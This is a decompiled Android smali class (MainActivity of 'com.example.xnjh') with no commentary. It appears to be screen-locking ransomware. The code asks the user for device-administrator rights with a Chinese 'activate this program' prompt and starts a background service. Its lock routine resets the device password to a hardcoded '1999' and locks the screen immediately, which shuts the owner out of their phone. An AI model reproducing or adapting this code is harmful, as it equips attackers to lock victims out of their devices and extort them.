.class public Lcom/example/xnjh/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/example/xnjh/MainActivity$100000000;
    }
.end annotation


# static fields
.field private static password:Ljava/lang/String;


# instance fields
.field private componentName:Landroid/content/ComponentName;

.field private dpm:Landroid/app/admin/DevicePolicyManager;

.field private editText1:Landroid/widget/EditText;

.field private isAdminActive:Z


# direct methods
.method static final constructor <clinit>()V
    .locals 3

    const-string v2, "1999"

    sput-object v2, Lcom/example/xnjh/MainActivity;->password:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    .line 86
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method static synthetic access$1000009(Lcom/example/xnjh/MainActivity;Landroid/content/ComponentName;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    invoke-direct {v4, v5}, Lcom/example/xnjh/MainActivity;->getAdmin(Landroid/content/ComponentName;)V

    return-void
.end method

.method static synthetic access$L1000002(Lcom/example/xnjh/MainActivity;)Landroid/content/ComponentName;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/example/xnjh/MainActivity;->componentName:Landroid/content/ComponentName;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000003(Lcom/example/xnjh/MainActivity;)Z
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-boolean v3, v3, Lcom/example/xnjh/MainActivity;->isAdminActive:Z

    move v0, v3

    return v0
.end method

.method static synthetic access$S1000002(Lcom/example/xnjh/MainActivity;Landroid/content/ComponentName;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/example/xnjh/MainActivity;->componentName:Landroid/content/ComponentName;

    return-void
.end method

.method static synthetic access$S1000003(Lcom/example/xnjh/MainActivity;Z)V
    .locals 6

    move-object v0, p0

    move v1, p1

    move-object v4, v0

    move v5, v1

    iput-boolean v5, v4, Lcom/example/xnjh/MainActivity;->isAdminActive:Z

    return-void
.end method

.method private checkAdmin()V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 58
    move-object v0, p0

    move-object v3, v0

    new-instance v4, Landroid/content/ComponentName;

    move-object v11, v4

    move-object v4, v11

    move-object v5, v11

    move-object v6, v0

    :try_start_0
    const-string v7, "com.example.xnjh.MyAdmin"

    invoke-static {v7}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v7

    invoke-direct {v5, v6, v7}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v4, v3, Lcom/example/xnjh/MainActivity;->componentName:Landroid/content/ComponentName;

    .line 59
    move-object v3, v0

    move-object v4, v0

    iget-object v4, v4, Lcom/example/xnjh/MainActivity;->dpm:Landroid/app/admin/DevicePolicyManager;

    move-object v5, v0

    iget-object v5, v5, Lcom/example/xnjh/MainActivity;->componentName:Landroid/content/ComponentName;

    invoke-virtual {v4, v5}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v4

    iput-boolean v4, v3, Lcom/example/xnjh/MainActivity;->isAdminActive:Z

    return-void

    .line 58
    :catch_0
    move-exception v3

    move-object v1, v3

    new-instance v3, Ljava/lang/NoClassDefFoundError;

    move-object v11, v3

    move-object v3, v11

    move-object v4, v11

    move-object v5, v1

    invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v3
.end method

.method private getAdmin(Landroid/content/ComponentName;)V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ComponentName;",
            ")V"
        }
    .end annotation

    .prologue
    .line 76
    move-object v0, p0

    move-object v1, p1

    new-instance v4, Landroid/content/Intent;

    move-object v7, v4

    move-object v4, v7

    move-object v5, v7

    invoke-direct {v5}, Landroid/content/Intent;-><init>()V

    move-object v2, v4

    .line 78
    move-object v4, v2

    const-string v5, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-virtual {v4, v5}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v4

    .line 80
    move-object v4, v2

    const-string v5, "android.app.extra.DEVICE_ADMIN"

    move-object v6, v1

    invoke-virtual {v4, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object v4

    .line 82
    move-object v4, v2

    const-string v5, "android.app.extra.ADD_EXPLANATION"

    const-string v6, "------\u6fc0\u6d3b\u672c\u7a0b\u5e8f-------"

    invoke-virtual {v4, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v4

    .line 85
    move-object v4, v0

    move-object v5, v2

    invoke-virtual {v4, v5}, Lcom/example/xnjh/MainActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method private lock()V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 65
    move-object v0, p0

    move-object v2, v0

    iget-object v2, v2, Lcom/example/xnjh/MainActivity;->dpm:Landroid/app/admin/DevicePolicyManager;

    sget-object v3, Lcom/example/xnjh/MainActivity;->password:Ljava/lang/String;

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    move-result v2

    .line 66
    move-object v2, v0

    iget-object v2, v2, Lcom/example/xnjh/MainActivity;->dpm:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v2}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    return-void
.end method

.method private removeAdmin(Landroid/content/ComponentName;)V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ComponentName;",
            ")V"
        }
    .end annotation

    .prologue
    .line 71
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    iget-object v3, v3, Lcom/example/xnjh/MainActivity;->dpm:Landroid/app/admin/DevicePolicyManager;

    move-object v4, v1

    invoke-virtual {v3, v4}, Landroid/app/admin/DevicePolicyManager;->removeActiveAdmin(Landroid/content/ComponentName;)V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v1, p1

    move-object v5, v0

    invoke-static {v5}, LLogCatBroadcaster;->start(Landroid/content/Context;)V

    .line 26
    move-object v5, v0

    move-object v6, v1

    invoke-super {v5, v6}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 27
    move-object v5, v0

    const/high16 v6, 0x7f030000

    invoke-virtual {v5, v6}, Lcom/example/xnjh/MainActivity;->setContentView(I)V

    .line 28
    new-instance v5, Landroid/content/Intent;

    move-object v12, v5

    move-object v5, v12

    move-object v6, v12

    move-object v7, v0

    :try_start_0
    const-string v8, "com.example.xnjh.llxfc"

    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v8

    invoke-direct {v6, v7, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v2, v5

    .line 29
    move-object v5, v0

    move-object v6, v2

    invoke-virtual {v5, v6}, Lcom/example/xnjh/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v5

    .line 31
    move-object v5, v0

    move-object v6, v0

    const-string v7, "device_policy"

    invoke-virtual {v6, v7}, Lcom/example/xnjh/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/admin/DevicePolicyManager;

    iput-object v6, v5, Lcom/example/xnjh/MainActivity;->dpm:Landroid/app/admin/DevicePolicyManager;

    .line 33
    move-object v5, v0

    invoke-direct {v5}, Lcom/example/xnjh/MainActivity;->checkAdmin()V

    .line 34
    move-object v5, v0

    const/high16 v6, 0x7f090000

    invoke-virtual {v5, v6}, Lcom/example/xnjh/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v5

    new-instance v6, Lcom/example/xnjh/MainActivity$100000000;

    move-object v12, v6

    move-object v6, v12

    move-object v7, v12

    move-object v8, v0

    invoke-direct {v7, v8}, Lcom/example/xnjh/MainActivity$100000000;-><init>(Lcom/example/xnjh/MainActivity;)V

    invoke-virtual {v5, v6}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void

    .line 28
    :catch_0
    move-exception v5

    move-object v3, v5

    new-instance v5, Ljava/lang/NoClassDefFoundError;

    move-object v12, v5

    move-object v5, v12

    move-object v6, v12

    move-object v7, v3

    invoke-virtual {v7}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v5
.end method
